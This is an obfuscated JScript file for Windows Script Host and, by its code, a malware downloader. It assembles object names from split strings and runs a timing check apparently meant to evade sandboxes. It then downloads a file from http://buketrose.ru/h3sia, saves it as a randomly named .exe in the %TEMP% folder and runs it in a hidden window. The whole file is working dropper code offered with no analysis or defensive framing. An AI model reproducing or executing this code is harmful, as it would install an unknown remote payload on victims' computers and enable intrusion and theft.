var GL = false;
var SP = "Create"+"Object";
var NI = function K() {return WScript[SP]("WScript"+".Shell");}(), S = 11;
var SG = "MSXML2"+".XMLHTTP";
var N0 = 2;
var M = N0 - 2;
function VK(FR){NI["Run"](FR, M, M);};
function EW(){return SG + "";};
function MI(RQ, EO){M = M * 1; return RQ - EO;};
function BQ(){return SP;};
/*@cc_on
  @if (@_win32 || @_win64)
    GL = true;
  @end
@*/
if (GL)
{
var HD = "";
function OS(){return 22;};
var E0 = 0; var VT = 0;
function H()
{
var DJ = new this["Date"]();
var K0 = DJ["getUTCMilliseconds"]();
WScript["Sleep"](OS());
var DJ = new this["Date"]();
var V = DJ["getUTCMilliseconds"]();
WScript["Sleep"](OS());
var DJ = new this["Date"]();
var A = DJ["getUTCMilliseconds"]();
var E0 = "EK";
E0 = MI(V, K0);
var VT = "EB";
VT = MI(A, V);
HD = "open";
return MI(E0, VT);
}
var YT = false;
var IR = false;
for (var ID = M; ID < OS() * 1; ID++){if (H() != M){
YT = true; 
VT = "31" + 11 * E0 + VT; 
IR = true; 
break;
}}
function R() {return ((YT == true) && (YT == IR)) ? 1 : M;};
if (YT && R() && IR){
function N() {return NI["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "6HEEvFKTnBfY.ex" + "e";};
 QL = EW();
 VP = WScript[SP](QL);
 var IE = 1;
do { 
	for (;IE;){
	try {
		if (IE == 1)
		{
			VP[HD]("GET", "http://buketrose.ru/h3sia", false);
			VP["send"]();
			E = "Sleep";
			IE = 2;
		}
		WScript[E](OS() + 120); 
		if (VP["readystate"] < 2 * 2) continue;
		IE = M;
		function B(R0) {var XE = (1, 2, 3, 4, 5, R0); return XE;};
		E1 = WScript[BQ()]("ADODB.Stream");
		QL = E1;
		QL[HD]();
		QL["type"] = B(1);
		QL["write"](VP["ResponseBody"]);
		E1["position"] = B(M);
		QL["Save" + "ToFile"](N(), 2);
		E1["cl"+"ose"]();
		MU = N();
		VK(MU);
	} catch(JZ){};};
}while (IE);
}
}

